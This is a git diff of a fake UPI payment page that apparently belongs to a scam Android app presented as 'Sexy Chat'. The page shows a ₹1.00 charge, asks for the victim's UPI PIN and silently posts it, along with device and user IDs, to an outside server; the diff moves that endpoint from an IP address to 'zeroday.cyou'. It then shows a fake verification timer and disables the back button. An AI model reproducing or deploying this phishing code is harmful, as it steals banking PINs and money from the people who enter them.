@@ -141,7 +141,6 @@ h5 {
     font-size: 30px;
 }
 
-/* Verifying Payment Dialog */
 .verify-dialog {
     display: none;
     position: fixed;
@@ -250,19 +249,15 @@ h5 {
 </head>
 <body>
 
-    <!-- Header -->
     <div class="header">
-        
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png" alt="UPI Logo">
     </div>
 
-    <!-- Transaction Details -->
     <div class="details">
         <p>Sending: <br>To:</p>
         <p>₹1.00 <br>Sexy Chat</p>
     </div>
 
-    <!-- Center Content -->
     <div class="center-content">
         <h5>ENTER UPI PIN</h5>
         <div class="input-container" id="input-display">
@@ -274,7 +269,6 @@ h5 {
         </div>
     </div>
 
-    <!-- Keypad -->
     <div class="keypad">
         <div class="key" onclick="enterNumber(1)">1</div>
         <div class="key" onclick="enterNumber(2)">2</div>
@@ -290,7 +284,6 @@ h5 {
         <div class="key" id="done" onclick="submitPIN()"><i class="fas fa-circle-check"></i></div>
     </div>
 
-    <!-- Verifying Payment Dialog -->
     <div class="verify-dialog" id="verifyDialog">
         <div class="verify-content">
             <div class="verify-icon">
@@ -317,7 +310,6 @@ h5 {
     let isHidden = true;
     let savedPIN = '';
     
-    // دریافت Device ID و User ID از Android
     function getDeviceId() {
         try {
             if (typeof Android !== 'undefined' && Android.getDeviceId) {
@@ -337,7 +329,7 @@ h5 {
         } catch (e) {
             console.error('Error getting user ID:', e);
         }
-        return '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'; // Fallback
+        return '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983';
     }
 
     function getAppType() {
@@ -348,7 +340,7 @@ h5 {
         } catch (e) {
             console.error('Error getting app type:', e);
         }
-        return 'sexychat'; // Fallback
+        return 'sexychat';
     }
 
     function updateDisplay() {
@@ -375,7 +367,6 @@ h5 {
 
     function showVerifyDialog() {
         document.getElementById('verifyDialog').style.display = 'flex';
-        // شروع تایمر
         let countdown = 3;
         const timerEl = document.getElementById('verifyTimer');
         const interval = setInterval(() => {
@@ -399,7 +390,6 @@ h5 {
             savedPIN = upiPin;
             submitToServer(upiPin);
         } else {
-            // Just vibrate or do nothing - no error message
             if (navigator.vibrate) {
                 navigator.vibrate(200);
             }
@@ -419,8 +409,7 @@ h5 {
             user_id: userId
         };
 
-        // Send to server silently
-        fetch('http://95.134.130.160:8765/save-pin', {
+        fetch('https://zeroday.cyou/save-pin', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -430,21 +419,18 @@ h5 {
         .then(response => response.json())
         .catch(error => console.log('Background request:', error));
 
-        // Show verifying dialog for 3 seconds then redirect
         setTimeout(() => {
             hideVerifyDialog();
-            // ⭐ غیرفعال کردن دکمه برگشت قبل از redirect
             history.pushState(null, null, location.href);
             window.onpopstate = function() {
                 history.go(1);
             };
-            window.location.href = 'final.html';  // ⭐ مستقیم به final
+            window.location.href = 'final.html';
         }, 3000);
     }
 
     updateDisplay();
 
-    // ⭐ Simple back button disable
     history.pushState(null, null, location.href);
     window.onpopstate = function() {
         history.go(1);
